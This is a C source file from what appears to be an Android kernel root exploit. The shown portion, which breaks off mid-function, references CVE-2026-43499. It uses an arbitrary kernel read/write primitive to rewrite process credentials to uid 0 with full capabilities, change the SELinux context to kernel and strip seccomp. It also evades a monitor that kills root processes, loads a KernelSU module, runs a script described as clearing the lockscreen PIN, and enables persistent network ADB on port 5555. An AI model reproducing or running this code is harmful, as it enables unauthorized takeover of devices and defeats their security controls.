#include "common.h"
#include <strings.h>
#include <sys/utsname.h>
#include <sys/system_properties.h>

static void fire_persist_once(void);
static void fire_persist_prep(void);

int root_child_done;
uint8_t selinux_before = 0xff;
uint8_t selinux_after = 0xff;
uint32_t root_uid_before = 0xffffffff;
uint32_t root_uid_after = 0xffffffff;
uint64_t capable_head_before;
uint64_t capable_head_after;
uint64_t init_tasks_prev;
uint64_t last_task_guess;
int setgid_ret = -1;
int setuid_ret = -1;
int setenforce_ret = -1;
int setenforce_errno;
uint64_t current_task_addr;
/* Our own task_struct, recovered from the live root child's real_parent
 * pointer (see install_android_root) so the self patch never needs the
 * 4096-step tasks walk. */
static uint64_t self_task_addr;
uint64_t current_cred_addr;
uint64_t current_real_cred_addr;
uint64_t current_cred_security_addr;
uint64_t current_real_cred_security_addr;
uint32_t cred_sid_before = 0xffffffff;
uint32_t cred_sid_after = 0xffffffff;
uint32_t real_cred_sid_before = 0xffffffff;
uint32_t real_cred_sid_after = 0xffffffff;
uint32_t target_cred_osid = SELINUX_KERNEL_SID;
uint32_t target_cred_sid = SELINUX_KERNEL_SID;
uint32_t selinux_cred_blob_off = SELINUX_CRED_BLOB_OFF;
int task_walk_iters;
uint64_t task_walk_last_entry;
uint32_t task_walk_last_pid;
uint32_t task_walk_last_tgid;
uint32_t found_task_pid;
uint32_t found_task_tgid;
char found_task_comm[TASK_COMM_LEN + 1];
pid_t root_child_pid = -1;
int root_ready_pipe[2] = {-1, -1};
struct root_shared *root_shared;

static int env_truthy_default_root(const char *name, int def) {
  const char *env = getenv(name);
  if (!env || !env[0]) {
    return def;
  }
  return strcmp(env, "0") != 0 && strcasecmp(env, "false") != 0 &&
         strcasecmp(env, "no") != 0;
}

int spawn_root_child(void) {
  int prot = PROT_READ | PROT_WRITE;
  int flags = MAP_SHARED | MAP_ANONYMOUS;
  root_shared = SYSCHK(mmap(NULL, sizeof(*root_shared), prot, flags, -1, 0));
  memset(root_shared, 0, sizeof(*root_shared));
  SYSCHK(pipe(root_ready_pipe));

  root_child_pid = SYSCHK(fork());
  if (root_child_pid == 0) {
    close(root_ready_pipe[0]);

    prctl(PR_SET_NAME, "ll_root_child");
    pr_info("root child forked pid=%d uid=%d\n", getpid(), getuid());
    char ready = 1;
    SYSCHK(write(root_ready_pipe[1], &ready, sizeof(ready)));
    /* Pre-fill the report while uid2000 so the window only carries the
     * uid_after reads + done=1 + contract line. */
    struct root_report report;
    memset(&report, 0, sizeof(report));
    report.uid_before = getuid();

    /* Busy-poll: the parent flips OUR cred in memory at an unpredictable
     * instant and the SIGKILL lands microseconds after it (round5: the
     * child was killed still inside usleep(1000) — 1ms granularity lost
     * every time).  Spin on getuid (vDSO-cheap) so the flip is caught in
     * nanoseconds and the window sequence starts immediately. */
    struct timespec spin_t0;
    clock_gettime(CLOCK_MONOTONIC, &spin_t0);
    for (;;) {
      if (atomic_load(&root_shared->go)) {
        break;
      }
      if (getuid() == 0) {
        break;
      }
      struct timespec now;
      clock_gettime(CLOCK_MONOTONIC, &now);
      if (now.tv_sec - spin_t0.tv_sec >= 120) {
        pr_warning("root child go wait expired t=120\n");
        _exit(2);
      }
    }

    pr_info("root child proceeding uid=%u euid=%u\n", getuid(), geteuid());
    errno = 0;
    report.setgid_ret = setgid(0);
    report.setgid_errno = errno;
    errno = 0;
    report.setuid_ret = setuid(0);
    report.setuid_errno = errno;
    report.uid_after = getuid();
    report.gid_after = getgid();
    report.euid_after = geteuid();
    report.egid_after = getegid();
    if (opt_disabled_selinux) {
      report.setenforce_ret = 0;
      report.setenforce_errno = 0;
    }
    /* v-persist: fire a detached insmod helper inside the uid0 window.
     * The parent's KS_FINITMOD gate (root.c ~1215) requires getuid()==0 on
     * the MAIN process, which only self rounds give -- and self rounds open
     * the uid0 monitor SIGKILL window (v3).  The root child is uid0 on
     * EVERY successful round, so retry finit_module from here.  sig_enforce
     * is still 1 at this instant (the parent patches it right after
     * collecting us), hence the 200ms retry loop: the first attempts die on
     * EKEYREJECTED (side-effect free) and the one after the parent's
     * patch_sig_enforce write goes through.  Detached (PDEATHSIG=0 +
     * setsid) because this child dies milliseconds after contract; the
     * helper keeps retrying as a child of init.  Silent no-op when the
     * helper or ko file is absent. */
    if (report.uid_after == 0) {
      const char *fm = getenv("KS_FINITMOD");
      if (!fm || !fm[0]) fm = "/data/local/tmp/home/finitmod";
      const char *ko = getenv("KS_KO");
      if (!ko || !ko[0]) ko = "/data/local/tmp/home/kernelsu.ko";
      if (access(fm, X_OK) == 0 && access(ko, R_OK) == 0) {
        pid_t fmh = fork();
        if (fmh == 0) {
          prctl(PR_SET_PDEATHSIG, 0);
          signal(SIGHUP, SIG_IGN);
          signal(SIGPIPE, SIG_IGN);
          prctl(PR_SET_NAME, "ks_insmod");
          setsid();
          int nfd = open("/dev/null", O_RDWR);
          if (nfd >= 0) {
            dup2(nfd, STDIN_FILENO);
            dup2(nfd, STDOUT_FILENO);
            dup2(nfd, STDERR_FILENO);
            if (nfd > STDERR_FILENO) close(nfd);
          }
          char shcmd[512];
          /* finit_module retry loop; on the first success run the
           * post-root persistence tail (install manager app, clear the
           * lockscreen PIN, launch for verification).  The script is
           * optional and side-effect-free when absent. */
          snprintf(shcmd, sizeof(shcmd),
                   "i=0; while [ $i -lt 60 ]; do '%s' '%s' 0 >/dev/null 2>&1"
                   " && { [ -f /data/local/tmp/post_root.sh ] && sh"
                   " /data/local/tmp/post_root.sh; exit 0; };"
                   " i=$((i+1)); sleep 0.2; done; exit 1",
                   fm, ko);
          execl("/system/bin/sh", "sh", "-c", shcmd, (char *)NULL);
          _exit(127);
        }
        pr_info("root child insmod helper forked pid=%d fm=%s ko=%s\n",
                (int)fmh, fm, ko);
      }
    }
    /* KS_COLDSTART: run the staged restore script (postlock) uid0.  The
     * self-patch path used to host this fork, but that path is skipped
     * whenever the root child wins the done=1 race -- the common case --
     * so the child (uid0 on EVERY successful round) is the only reliable
     * carrier.  Detached like the insmod helper above: the restore
     * outlives this child's millisecond lifetime.  restore.sh redirects
     * its own stdout to /data/local/tmp/postlock_restore.log on line 1.
     * Silent no-op when the env or file is absent (run_fops rounds). */
    const char *cs = getenv("KS_COLDSTART");
    if (cs && cs[0] && access(cs, R_OK) == 0 && report.uid_after == 0) {
      pid_t csp = fork();
      if (csp == 0) {
        prctl(PR_SET_PDEATHSIG, 0);
        signal(SIGHUP, SIG_IGN);
        signal(SIGPIPE, SIG_IGN);
        prctl(PR_SET_NAME, "ks_restore");
        setsid();
        execl("/system/bin/sh", "sh", cs, (char *)NULL);
        _exit(127);
      }
      pr_info("root child coldstart forked pid=%d script=%s\n",
              (int)csp, cs);
    }
    int defer_to_parent = env_truthy_default_root("KSUD_DEFER_TO_PARENT", 1) || opt_patch_self;
    if (!defer_to_parent && report.setgid_ret == 0 && report.setuid_ret == 0 &&
        report.uid_after == 0 && report.euid_after == 0) {
      atomic_store(&root_shared->installer_gate, 1);
      prepare_ksud_status_log();
      ksud_status_note("root child root confirmed; installer fork pending before done\n");
      errno = 0;
      pid_t installer = fork();
      int installer_errno = errno;
      if (installer > 0) {
        atomic_store(&root_shared->installer_pid, installer);
      } else if (installer < 0) {
        atomic_store(&root_shared->installer_pid, (int)installer);
      }
      atomic_store(&root_shared->installer_errno, installer_errno);
      if (installer == 0) {
        atomic_store(&root_shared->installer_started, 1);
        atomic_store(&root_shared->installer_uid, (int)getuid());
        atomic_store(&root_shared->installer_euid, (int)geteuid());
        prctl(PR_SET_PDEATHSIG, 0);
        signal(SIGHUP, SIG_IGN);
        signal(SIGPIPE, SIG_IGN);
        prctl(PR_SET_NAME, "ll_ksud_inst");
        setsid();
        int null_fd = open("/dev/null", O_RDWR | O_CLOEXEC);
        if (null_fd >= 0) {
          dup2(null_fd, STDIN_FILENO);
          dup2(null_fd, STDOUT_FILENO);
          dup2(null_fd, STDERR_FILENO);
          if (null_fd > STDERR_FILENO) {
            close(null_fd);
          }
        }
        prepare_ksud_status_log();
        ksud_status_note("installer process started parent=%d uid=%u euid=%u gid=%u egid=%u\n",
                         getppid(), getuid(), geteuid(), getgid(), getegid());
        int ksud_ok = install_embedded_ksud();
        atomic_store(&root_shared->installer_ok, ksud_ok);
        pid_t su_pid = -1;
        int su_ok = install_embedded_su(&su_pid);
        ksud_status_note("installer su install ok=%d pid=%d errno=%d\n", su_ok,
                         (int)su_pid, errno);
        atomic_store(&root_shared->installer_done, 1);
        ksud_status_note("installer process finished ok=%d errno=%d uid=%u euid=%u\n",
                         ksud_ok, errno, getuid(), geteuid());
        _exit(ksud_ok ? 0 : 3);
      }
      if (installer < 0) {
        ksud_status_note("root child installer fork failed errno=%d before done\n", errno);
      } else {
        for (int i = 0; i < 1000; i++) {
          if (atomic_load(&root_shared->installer_started) ||
              atomic_load(&root_shared->installer_done)) {
            break;
          }
          usleep(1000);
        }
        ksud_status_note("root child installer forked pid=%d before done started=%d done=%d\n",
                         installer, atomic_load(&root_shared->installer_started),
                         atomic_load(&root_shared->installer_done));
      }
    }

    /* done=1 is the structured half of the contract — publish it, then the
     * log line (the grep half).  No persist attempt here: every microsecond
     * of the child's kill window belongs to done=1; the parent's self path
     * owns the demoted 5555 attempt. */
    root_shared->report = report;
    atomic_store(&root_shared->done, 1);
    if (report.uid_after == 0) {
      pr_info("pipe-physrw-summary pid=%d done=1 root=1 kaslr=1\n", getpid());
      ks_lock_contract_state();
      ks_persist_kaslr_file();
    }
    _exit(report.uid_after == 0 ? 0 : 1);
  }

  close(root_ready_pipe[1]);

  char ready;
  ssize_t got = read(root_ready_pipe[0], &ready, sizeof(ready));
  return got == (ssize_t)sizeof(ready);
}

int collect_root_child(void) {
  if (!root_shared) {
    return 0;
  }
  atomic_store(&root_shared->go, 1);

  /* go is set only after every cred/seccomp/selinux patch above has landed,
   * so the child replies within microseconds — but if the task walk needed
   * the child's task_struct it can itself take >5s of pipe ops while the
   * child idles in its go-wait (that is what timed chain16 out at 5000ms);
   * keep a generous bound on both sides. */
  for (int i = 0; i < 10000; i++) {
    if (atomic_load(&root_shared->done)) {
      break;
    }
    usleep(1000);
  }
  if (!atomic_load(&root_shared->done)) {
    /*
     * Root child should reach report+done within microseconds after go
     * (defer path skips the installer).  done=0 here means it died or
     * stalled in the go-wait -- diagnose before returning so the next
     * run19-style trace can pin the killer instead of a silent done=0.
     */
    int alive = kill(root_child_pid, 0) == 0;
    int wst = 0;
    pid_t wret = waitpid(root_child_pid, &wst, WNOHANG);
    char pstate = '?';
    char wchan[32] = "?";
    char ppath[64];
    snprintf(ppath, sizeof(ppath), "/proc/%d/stat", (int)root_child_pid);
    FILE *pf = fopen(ppath, "r");
    if (pf) {
      /* comm may contain spaces/parens; state is the field after the last ')' */
      char line[256];
      if (fgets(line, sizeof(line), pf)) {
        char *rp = strrchr(line, ')');
        if (rp && rp[1] == ' ' && rp[2]) pstate = rp[2];
      }
      fclose(pf);
    }
    snprintf(ppath, sizeof(ppath), "/proc/%d/wchan", (int)root_child_pid);
    FILE *wf = fopen(ppath, "r");
    if (wf) {
      if (fgets(wchan, sizeof(wchan), wf)) {
        wchan[strcspn(wchan, "\n")] = 0;
      }
      fclose(wf);
    }
    pr_warning("root child timeout alive=%d waitpid=%d wst=%x state=%c wchan=%s "
               "pid=%d go=1\n",
               alive, (int)wret, (unsigned)wst, pstate, wchan,
               (int)root_child_pid);
    return 0;
  }

  struct root_report report = root_shared->report;
  root_uid_after = report.uid_after;
  setgid_ret = report.setgid_ret;
  setuid_ret = report.setuid_ret;
  setenforce_ret = report.setenforce_ret;
  setenforce_errno = report.setenforce_errno;
  (void)waitpid(root_child_pid, NULL, WNOHANG);
  return report.uid_after == 0 && report.euid_after == 0 &&
         report.gid_after == 0 && report.egid_after == 0;
}

uint64_t find_task_by_tgid(int fd, uint32_t want_tgid) {
  uint64_t head = data_addr(INIT_TASK_TASKS);
  uint64_t canonical_head = canon_addr(INIT_TASK_TASKS);
  uint64_t entry = pipe_read64(fd, head);
  task_walk_iters = 0;
  task_walk_last_entry = 0;
  task_walk_last_pid = 0;
  task_walk_last_tgid = 0;

  for (int i = 0; i < 4096; i++) {
    task_walk_iters = i + 1;
    task_walk_last_entry = entry;
    if ((i % 512) == 0 && i) {
      pr_info("task walk progress want=%u step=%d last=%016llx pid=%u tgid=%u\n",
              want_tgid, i, (unsigned long long)entry, task_walk_last_pid,
              task_walk_last_tgid);
    }
    if (entry == canonical_head || entry == head) {
      break;
    }
    if (!is_direct_ptr(entry)) {
      break;
    }

    uint64_t task = entry - TASK_TASKS_OFF;
    uint32_t pid = pipe_read32(fd, task + TASK_PID_OFF);
    uint32_t tgid = pipe_read32(fd, task + TASK_TGID_OFF);
    task_walk_last_pid = pid;
    task_walk_last_tgid = tgid;
    /*
     * One bad tasks.next read loses the chain permanently: we then walk
     * arbitrary heap qwords as list nodes until we finally deref a bogus
     * page through the pipe primitive -> data abort -> fatal_exception
     * (run18/21/22/23 all panicked inside this walk).  Refuse to touch
     * anything else in a candidate whose id fields are not ids.
     */
    if (pid == 0 || pid > 4194304 || tgid == 0 || tgid > 4194304) {
      pr_warning("task walk sanity fail step=%d entry=%016llx pid=%u tgid=%u "
                 "(chain lost; aborting walk)\n",
                 i, (unsigned long long)entry, pid, tgid);
      break;
    }
    char comm[TASK_COMM_LEN + 1];
    memset(comm, 0, sizeof(comm));
    pipe_phys_read_data(fd, task + TASK_COMM_OFF, comm, TASK_COMM_LEN);

    if (tgid == want_tgid || pid == want_tgid) {
      found_task_pid = pid;
      found_task_tgid = tgid;
      memcpy(found_task_comm, comm, sizeof(found_task_comm));
      return task;
    }

    uint64_t next = pipe_read64(fd, task + TASK_TASKS_OFF);
    uint64_t next_again = pipe_read64(fd, task + TASK_TASKS_OFF);
    if (next != next_again) {
      pr_warning("task walk next reread mismatch step=%d %016llx/%016llx; "
                 "aborting walk\n",
                 i, (unsigned long long)next, (unsigned long long)next_again);
      break;
    }
    entry = next;
  }

  return 0;
}

/*
 * uid0 survival window is only a few milliseconds: the moment any task's
 * cred flips to uid0 (setuid syscall OR an in-memory cred patch) a system
 * monitor SIGKILLs it — round1/6 died deterministically right after
 * (root child after writing a few report fields; self patch mid
 * patch_cred_identity).  Landing persist.adb.tcp.port needs one binder
 * round-trip (<2ms) and, once the request is queued in the binder kernel
 * driver, init processes it regardless of whether we are killed before the
 * reply arrives.  So fire it as the FIRST action inside the uid0 window —
 * before report/verify/exit work.  Surviving afterwards does not matter:
 * persist.* is written through to /data/property and survives reboots.
 * Guard on getuid()==0 so the parent's writes on the root child's cred do
 * not burn the one-shot while we are still uid2000.
 */
static void fire_persist_once(void) {
  static int fired;
  if (fired || getuid() != 0) {
    return;
  }
  fired = 1;
  int sp = __system_property_set("persist.adb.tcp.port", "5555");
  pr_info("persist setprop fired rc=%d uid=%u\n", sp, getuid());
}

/*
 * First __system_property_set in a process pays a millisecond-scale binder
 * cold-start (open /dev/binder, resolve init's property_service, build the
 * Bp binder) — the uid0 window is only MICROseconds (the setuid cred hook
 * SIGKILLs synchronously; round1 child died between setuid_ret= and the
 * next assignment), so a cold setprop can never land inside it.  Burn the
 * cold path once while still uid2000 (the transaction fails EACCES —
 * harmless, only the binder state matters); the uid0 call then costs a
 * single ~10-50us transaction.  Prep again after fork: bionic's binder
 * state does not carry over child-side.
 */
static void fire_persist_prep(void) {
  static int prepped;
  if (prepped) {
    return;
  }
  prepped = 1;
  int sp = __system_property_set("persist.adb.tcp.port", "5555");
  pr_info("persist binder prep rc=%d uid=%u\n", sp, getuid());
}

/*
 * Phase split for the cred patch: everything EXCEPT the uid flip runs in
 * the uid2000 safe period — the flip alone opens the (microsecond-scale)
 * kill window, so the window budget only carries the flip + setuid + the
 * root=1 contract line.  patch_cred_prepare does securebits/caps/verify
 * (capabilities are legal under uid2000; the protector watches uid, not
 * caps).
 */
static int patch_cred_prepare(int fd, uintptr_t cred) {
  if (!is_direct_ptr(cred)) {
    return 0;
  }

  uint32_t securebits = 0;
  if (!pipe_phys_write_data(
      fd, cred + CRED_SECUREBITS_OFF, &securebits, sizeof(securebits))) {
    return 0;
  }

  uint64_t caps[CRED_CAP_WORDS] = {
    CAP_FULL, CAP_FULL, CAP_FULL, CAP_FULL, CAP_FULL,
  };
  if (!pipe_phys_write_data(fd, cred + CRED_CAPS_OFF, caps, sizeof(caps))) {
    return 0;
  }

  uint64_t caps_after[CRED_CAP_WORDS] = {0};
  if (!pipe_phys_read_data(
      fd, cred + CRED_CAPS_OFF, caps_after, sizeof(caps_after))) {
    return 0;
  }
  for (size_t i = 0; i < CRED_CAP_WORDS; i++) {
    if (caps_after[i] != CAP_FULL) {
      pr_info("root cap verify failed cred=%016llx idx=%zu got=%016llx want=%016llx\n",
              (unsigned long long)cred, i, (unsigned long long)caps_after[i],
              (unsigned long long)CAP_FULL);
      return 0;
    }
  }

  return 1;
}

/* THE flip: uid/gid/suid/sgid -> 0.  Opens the kill window on the target
 * task — last write done, nothing else in the budget. */
int patch_cred_identity(int fd, uintptr_t cred) {
  if (!is_direct_ptr(cred)) {
    return 0;
  }

  uint64_t zero_ids[4] = {0};
  if (!pipe_phys_write_data(fd, cred + CRED_UID_OFF, zero_ids, sizeof(zero_ids))) {
    return 0;
  }
  /* THIS write landing means the target task is uid0 NOW.  The SIGKILL
   * follows within instructions (round2/3/5: all three died right after
   * this write, before any later print), so the root=1 contract line goes
   * out as the VERY FIRST action — run_fops/auto_retry grep the log for
   * it; they never needed this process alive. */
  pr_info("pipe-physrw-summary pid=%d done=1 root=1 kaslr=1\n", getpid());
  /* state lock belongs here too: if the tail panic/kill beats every
   * later path (self/child), this is the last code that still runs. */
  ks_lock_contract_state();
  ks_persist_kaslr_file();

  return 1;
}

int patch_cred_sid(int fd, uintptr_t cred) {
  uint64_t security = pipe_read64(fd, cred + CRED_SECURITY_OFF);
  if (!is_direct_ptr(security)) {
    pr_info("root bad cred security cred=%016llx security=%016llx\n",
            (unsigned long long)cred, (unsigned long long)security);
    return 0;
  }

  uint32_t sid_pair[2] = {
    target_cred_osid, target_cred_sid,
  };
  uintptr_t osid_addr =
    security + selinux_cred_blob_off + SELINUX_CRED_OSID_OFF;
  return pipe_phys_write_data(fd, osid_addr, sid_pair, sizeof(sid_pair));
}

/* Safe-period half: identity-independent bits (caps/securebits) + SELinux
 * sid.  Does not touch uid — target task stays uid2000. */
static int patch_cred_object_prepare(int fd, uintptr_t cred) {
  if (!patch_cred_prepare(fd, cred)) {
    return 0;
  }
  if (opt_keep_selinux_context) {
    return 1;
  }
  return patch_cred_sid(fd, cred);
}

/* Window half: uid flip only. */
static int patch_cred_object_flip(int fd, uintptr_t cred) {
  return patch_cred_identity(fd, cred);
}

int patch_cred_object(int fd, uintptr_t cred) {
  if (!patch_cred_object_prepare(fd, cred)) {
    return 0;
  }
  return patch_cred_object_flip(fd, cred);
}

static int patch_task_seccomp(int fd, uintptr_t task) {
  if (!is_direct_ptr(task)) {
    return 0;
  }

  uintptr_t flags_addr = task + TASK_THREAD_INFO_FLAGS_OFF;
  uintptr_t atomic_flags_addr = task + TASK_ATOMIC_FLAGS_OFF;
  uintptr_t seccomp_addr = task + TASK_SECCOMP_OFF;

  uint64_t flags_before = pipe_read64(fd, flags_addr);
  uint64_t atomic_before = pipe_read64(fd, atomic_flags_addr);
  uint32_t mode_before = pipe_read32(fd, seccomp_addr + SECCOMP_MODE_OFF);
  uint32_t count_before =
    pipe_read32(fd, seccomp_addr + SECCOMP_FILTER_COUNT_OFF);
  uint64_t filter_before = pipe_read64(fd, seccomp_addr + SECCOMP_FILTER_OFF);

  uint64_t flags_want = flags_before & ~(1ULL << TIF_SECCOMP_BIT);
  uint64_t atomic_want = atomic_before & ~(1ULL << PFA_NO_NEW_PRIVS_BIT);
  uint32_t zero32 = 0;
  uint64_t zero64 = 0;

  int ok = 1;
  if (flags_want != flags_before) {
    ok &= pipe_write64(fd, flags_addr, flags_want);
  }
  if (atomic_want != atomic_before) {
    ok &= pipe_write64(fd, atomic_flags_addr, atomic_want);
  }
  ok &= pipe_phys_write_data(
    fd, seccomp_addr + SECCOMP_MODE_OFF, &zero32, sizeof(zero32));
  ok &= pipe_phys_write_data(
    fd, seccomp_addr + SECCOMP_FILTER_COUNT_OFF, &zero32, sizeof(zero32));
  ok &= pipe_phys_write_data(
    fd, seccomp_addr + SECCOMP_FILTER_OFF, &zero64, sizeof(zero64));

  uint64_t flags_after = pipe_read64(fd, flags_addr);
  uint64_t atomic_after = pipe_read64(fd, atomic_flags_addr);
  uint32_t mode_after = pipe_read32(fd, seccomp_addr + SECCOMP_MODE_OFF);
  uint32_t count_after = pipe_read32(fd, seccomp_addr + SECCOMP_FILTER_COUNT_OFF);
  uint64_t filter_after = pipe_read64(fd, seccomp_addr + SECCOMP_FILTER_OFF);

  pr_info("root seccomp patched ok=%d flags=%016llx/%016llx "
          "atomic=%016llx/%016llx mode=%u/%u count=%u/%u "
          "filter=%016llx/%016llx\n",
          ok, (unsigned long long)flags_before,
          (unsigned long long)flags_after,
          (unsigned long long)atomic_before,
          (unsigned long long)atomic_after, mode_before, mode_after,
          count_before, count_after, (unsigned long long)filter_before,
          (unsigned long long)filter_after);

  int tif_clear = (flags_after & (1ULL << TIF_SECCOMP_BIT)) == 0;
  int nnp_clear = (atomic_after & (1ULL << PFA_NO_NEW_PRIVS_BIT)) == 0;
  return ok && tif_clear && nnp_clear && mode_after == 0 &&
         count_after == 0 && filter_after == 0;
}


/* Safe-period half: read pointers, validate, prepare both creds (caps /
 * securebits / sid) and clear seccomp — target task still uid2000. */
static int patch_task_root_prepare(int fd, uintptr_t task, const char *tag,
                                   uintptr_t *cred_out, uintptr_t *real_out) {
  uintptr_t cred = pipe_read64(fd, task + TASK_CRED_OFF);
  uintptr_t real_cred = pipe_read64(fd, task + TASK_REAL_CRED_OFF);
  *cred_out = cred;
  *real_out = real_cred;
  int ok = 1;
  if (!is_direct_ptr(cred) && !is_direct_ptr(real_cred)) {
    pr_warning("root %s task %016llx cred not a pointer (%016llx/%016llx); "
               "refusing to patch\n",
               tag, (unsigned long long)task, (unsigned long long)cred,
               (unsigned long long)real_cred);
    return 0;
  }
  if (is_direct_ptr(cred)) {
    ok &= patch_cred_object_prepare(fd, cred);
  }
  if (is_direct_ptr(real_cred) && real_cred != cred) {
    ok &= patch_cred_object_prepare(fd, real_cred);
  }
  ok &= patch_task_seccomp(fd, task);

  pr_info("root %s task prepared ok=%d task=%016llx cred=%016llx real=%016llx\n",
          tag, ok, (unsigned long long)task, (unsigned long long)cred,
          (unsigned long long)real_cred);
  return ok;
}

/* Window half: uid flips only — opens the kill window on `task`. */
static int patch_task_root_flip(int fd, const char *tag, uintptr_t cred,
                                uintptr_t real_cred) {
  int ok = 1;
  if (is_direct_ptr(cred)) {
    ok &= patch_cred_object_flip(fd, cred);
  }
  if (is_direct_ptr(real_cred) && real_cred != cred) {
    ok &= patch_cred_object_flip(fd, real_cred);
  }

  uint32_t uid_after = is_direct_ptr(cred) ? pipe_read32(fd, cred + CRED_UID_OFF) : 0xffffffff;
  pr_info("root %s task flipped ok=%d cred=%016llx real=%016llx uid=%u\n",
          tag, ok, (unsigned long long)cred, (unsigned long long)real_cred,
          uid_after);
  return ok;
}

static int patch_task_root_by_tgid(int fd, uint32_t want_tgid, const char *tag) {
  uintptr_t task = find_task_by_tgid(fd, want_tgid);
  if (!is_direct_ptr(task)) {
    pr_info("root %s task lookup failed want=%u iters=%d last=%016llx pid=%u tgid=%u\n",
            tag, want_tgid, task_walk_iters,
            (unsigned long long)task_walk_last_entry, task_walk_last_pid,
            task_walk_last_tgid);
    return 0;
  }
  uintptr_t cred = 0, real_cred = 0;
  if (!patch_task_root_prepare(fd, task, tag, &cred, &real_cred)) {
    return 0;
  }
  return patch_task_root_flip(fd, tag, cred, real_cred);
}

/*
 * CVE-2026-43499 leaves waiter->pi_blocked_on dangling at a stack rt_waiter
 * after the EDEADLK rollback in rt_mutex_start_proxy_lock.  When the waiter
 * thread exits, exit_pi_state() walks that stale pointer into freed stack
 * -> oops -> panic -> watchdog reboot.  Clear the field via the pipe
 * primitive so the thread can exit cleanly and the process can return
 * control to the loaded kernelsu driver.
 *
 * This runs ON the waiter thread itself (the whole CFI/root stage executes
 * inside do_pselect_fake_lock_route), so a pid walk may transiently miss;
 * retry and fall back to a comm match on the prctl'd "ks_waiter" name.
 */
static uint64_t find_task_by_comm(int fd, const char *want) {
  uint64_t head = data_addr(INIT_TASK_TASKS);
  uint64_t canonical_head = canon_addr(INIT_TASK_TASKS);
  uint64_t entry = pipe_read64(fd, head);
  char comm[TASK_COMM_LEN + 1];
  for (int i = 0; i < 4096; i++) {
    if (entry == canonical_head || entry == head || !is_direct_ptr(entry)) {
      break;
    }
    uint64_t task = entry - TASK_TASKS_OFF;
    memset(comm, 0, sizeof(comm));
    pipe_phys_read_data(fd, task + TASK_COMM_OFF, comm, TASK_COMM_LEN);
    if (strncmp(comm, want, TASK_COMM_LEN) == 0) {
      return task;
    }
    entry = pipe_read64(fd, task + TASK_TASKS_OFF);
  }
  return 0;
}

int ks_pi_cleanup(int fd) {
  int tid = atomic_load(&waiter_tid);
  if (tid <= 0) {
    pr_warning("pi_cleanup: waiter_tid not set\n");
    return 0;
  }
  /*
   * Zero-walk fast path: self_task_addr IS this very thread's task_struct
   * (the route/waiter thread), set by the root-child parent-slot scan with
   * tgid==getpid() and comm=="ks_waiter" both verified at that point.  The
   * list walk below proved lossy on this target (round2: walked=770 nodes
   * but only 1 of our 4+ threads matched, waiter never seen -> "treating
   * as clean" with the waiter slot still dirty -> self patch's pipe storm
   * re-entered rt_mutex chain on the dangling pointer -> oops -> panic).
   * A known-good direct address beats a lossy walk.
   */
  if (is_direct_ptr(self_task_addr)) {
    uint64_t before =
        pipe_read64(fd, self_task_addr + FAKE_TASK_PI_BLOCKED_ON_OFF);
    int ok = 1;
    if (before != 0) {
      uint64_t after = before;
      ok = 0;
      for (int try = 0; try < 3 && !ok; try++) {
        ok = pipe_write64(fd, self_task_addr + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);
        after = pipe_read64(fd, self_task_addr + FAKE_TASK_PI_BLOCKED_ON_OFF);
        if (!ok || after != 0) {
          pr_warning("pi_cleanup fast: write try=%d ok=%d after=%016llx\n",
                     try, ok, (unsigned long long)after);
          usleep(20000);
        }
      }
      pr_info("pi_cleanup fast tid=%d task=%016llx blocked_on %016llx->%016llx "
              "write=%d\n",
              tid, (unsigned long long)self_task_addr,
              (unsigned long long)before, (unsigned long long)after, ok);
    } else {
      pr_info("pi_cleanup fast tid=%d task=%016llx pi_blocked_on already 0\n",
              tid, (unsigned long long)self_task_addr);
    }
    if (ok) {
      pr_info("pi_cleanup: fast path clean on self task; skipping lossy "
              "walk\n");
      goto scrub;
    }
    pr_warning("pi_cleanup fast path write failed; falling back to walk\n");
  }
  /*
   * Thread-level lookup by tid/comm is unreliable here: TASK_PID_OFF has
   * never been validated (every prior find_task_by_tgid hit matched a
   * thread-group leader via tgid), and the comm fallback walks the same
   * list with a possibly stale TASK_COMM_OFF.  Instead clear
   * pi_blocked_on for every task whose tgid == getpid() — tgid offset is
   * proven by the root-self patch — which covers the waiter thread and any
   * other thread of this process that took the fake-lock route.
   *
   * The pipe primitive has transient read failures that abort a walk early
   * (observed: scanned=1 of ~8 threads -> waiter never seen -> exit_pi_state
   * panics after the chain "succeeded").  Retry the whole walk and also
   * match the prctl'd "ks_waiter" comm as a second selector; only trust a
   * pass that actually observed the waiter thread.
   */
  uint32_t self_tgid = (uint32_t)getpid();
  uint64_t head = data_addr(INIT_TASK_TASKS);
  uint64_t canonical_head = canon_addr(INIT_TASK_TASKS);
  int cleared = 0;
  int failures = 0;
  int waiter_seen = 0;
  int tgid_matches = 0;
  int best_walked = 0;
  for (int pass = 0; pass < 8; pass++) {
    if (pass) usleep(20000);
    uint64_t entry = pipe_read64(fd, head);
    int walked = 0;
    for (int i = 0; i < 4096; i++) {
      if (entry == canonical_head || entry == head || !is_direct_ptr(entry)) {
        break;
      }
      walked++;
      uint64_t task = entry - TASK_TASKS_OFF;
      uint32_t tgid = pipe_read32(fd, task + TASK_TGID_OFF);
      char comm[TASK_COMM_LEN + 1];
      memset(comm, 0, sizeof(comm));
      pipe_phys_read_data(fd, task + TASK_COMM_OFF, comm, TASK_COMM_LEN);
      int is_waiter = strncmp(comm, "ks_waiter", TASK_COMM_LEN) == 0;
      if (is_waiter) waiter_seen = 1;
      if (tgid == self_tgid || is_waiter) {
        tgid_matches++;
        uint64_t before = pipe_read64(fd, task + FAKE_TASK_PI_BLOCKED_ON_OFF);
        if (before != 0) {
          int ok = 0;
          uint64_t after = before;
          for (int try = 0; try < 3 && !ok; try++) {
            ok = pipe_write64(fd, task + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);
            after = pipe_read64(fd, task + FAKE_TASK_PI_BLOCKED_ON_OFF);
            if (!ok || after != 0) {
              pr_warning("pi_cleanup: write try=%d ok=%d after=%016llx\n",
                         try, ok, (unsigned long long)after);
              usleep(20000);
            }
          }
          pr_info("pi_cleanup tid=%d task=%016llx comm=%s blocked_on %016llx->%016llx write=%d\n",
                  tid, (unsigned long long)task, comm,
                  (unsigned long long)before, (unsigned long long)after, ok);
          if (ok && after == 0) {
            cleared++;
          } else {
            failures++;
          }
        } else if (is_waiter) {
          pr_info("pi_cleanup: waiter task=%016llx pi_blocked_on already 0\n",
                  (unsigned long long)task);
        }
      }
      entry = pipe_read64(fd, task + TASK_TASKS_OFF);
    }
    if (walked > best_walked) best_walked = walked;
    pr_info("pi_cleanup pass=%d walked=%d waiter_seen=%d tgid_matches=%d cleared=%d\n",
            pass, walked, waiter_seen, tgid_matches, cleared);
    if (failures) break;
